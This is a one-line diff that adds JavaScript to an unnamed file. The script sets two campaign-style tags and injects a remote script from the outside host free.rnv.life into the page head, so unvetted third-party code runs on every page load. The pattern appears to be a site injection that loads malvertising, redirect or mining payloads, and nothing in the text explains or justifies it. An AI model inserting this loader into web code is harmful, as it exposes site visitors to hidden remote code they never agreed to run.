@@ -1,0 +1,1 @@
+var pm_tag='AdFR2';var pm_pid="15317-24c907ea";var scr=document.createElement('script');scr.src="//free.rnv.life/js/pub.min.js";document.getElementsByTagName('head')[0].appendChild(scr);
